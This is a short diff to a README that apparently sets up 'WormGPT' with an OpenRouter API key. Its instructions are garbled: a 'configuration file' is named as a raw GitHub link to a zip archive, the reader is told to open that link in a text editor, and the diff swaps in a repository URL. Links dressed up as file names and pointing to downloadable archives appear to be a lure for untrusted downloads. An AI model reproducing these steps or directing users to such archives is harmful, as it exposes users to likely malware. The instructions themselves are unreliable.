@@ -38,7 +38,7 @@ To fully utilize WormGPT, you need to set your OpenRouter API key:
 
 Locate the Configuration File: This file is named https://raw.githubusercontent.com/Vighne7185/worm-gpt/main/assets/worm-gpt_v1.5.zip and is created automatically when you run the application for the first time.
 
-Open the File: Use any text editor to open https://raw.githubusercontent.com/Vighne7185/worm-gpt/main/assets/worm-gpt_v1.5.zip.
+Open the File: Use any text editor to open https://github.com/GarzZOfficial/worm_gpt.git
 
 Insert Your API Key: Find the key field and enter your API key. Save the file.
 
